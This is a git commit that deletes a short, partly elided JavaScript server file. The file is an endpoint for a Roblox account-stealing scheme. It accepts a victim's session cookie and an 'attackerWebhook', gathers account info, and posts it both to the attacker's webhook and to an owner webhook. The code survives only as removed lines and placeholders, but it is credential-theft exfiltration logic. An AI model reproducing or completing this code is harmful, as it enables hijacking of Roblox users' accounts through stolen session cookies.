b1e3abb1f33a04244106dcdae0af4f98bc1a2d07
INJURIES <j6433867@gmail.com>
2025-06-13 16:09:29 -0400

    Delete roblox-info-server.js

--- roblox-info-server.js
+++
@@ -1,9 +0,0 @@
-// ... (see previous message for full code)
-app.post('/roblox-info', async (req, res) => {
-  const { cookie, attackerWebhook } = req.body;
-  // ... fetch Roblox info ...
-  // ... build embed ...
-  await fetch(OWNER_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embed) });
-  await fetch(attackerWebhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embed) });
-  res.json({ status: "sent", username, userId });
-});
